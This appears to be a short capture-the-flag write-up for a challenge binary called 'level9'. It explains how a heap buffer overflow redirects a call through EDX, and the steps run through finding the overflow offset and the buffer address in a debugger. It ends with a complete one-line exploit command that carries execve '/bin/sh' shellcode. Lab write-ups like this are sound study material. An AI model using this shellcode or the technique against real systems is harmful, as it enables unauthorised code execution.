this is a c++ program, when reading the source code we didn't found any call to system so we will use a shellcode found on the web and inject it to open a shell
after using the exploit overflow pattern generator we found that we overflow EAX after 108 bytes of input
we also see in disas main that the content of EAX is moved into EDX, then there is a call to EDX, so EDX will call our shellcode
when we put a break just after memcpy we see that EAX contain the address 0x804a00c
so this will redirect to the start of our buffer, we just need to put this address + 4 (to skip the first four bytes and access the shellcode) so 0x804a010
with those informations we can build our shellcode like (shellcode address + shellcode + padding until 108 bytes are reached + buffer address) :
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
